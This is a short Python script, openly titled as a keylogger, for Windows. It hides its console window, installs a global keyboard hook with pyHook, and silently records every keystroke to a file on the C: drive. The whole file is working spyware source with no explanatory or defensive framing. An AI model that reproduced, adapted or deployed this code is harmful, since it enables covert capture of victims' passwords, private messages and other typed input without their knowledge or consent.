# Keyloggers
import win32api
import win32console
import win32gui
import pythoncom
import pyHook
import sys

win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)

def OnKeyboardEvent(event):
    if event.Ascii == 5:
        sys.exit(1)
    if event.Ascii != 0 and event.Ascii != 8:
        # Open output.txt to read current keystrokes
        with open('c:\\output.txt', 'r+') as f:
            buffer = f.read()
            f.close()
        # Open output.txt to write current + new keystrokes
        with open('c:\\output.txt', 'w') as f:
            keylogs = chr(event.Ascii)
            if event.Ascii == 13:
                keylogs = '\n'
            buffer += keylogs
            f.write(buffer)
            f.close()

# Create a hook manager object
hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent

# Set the hook
hm.HookKeyboard()

# Wait forever
pythoncom.PumpMessages()
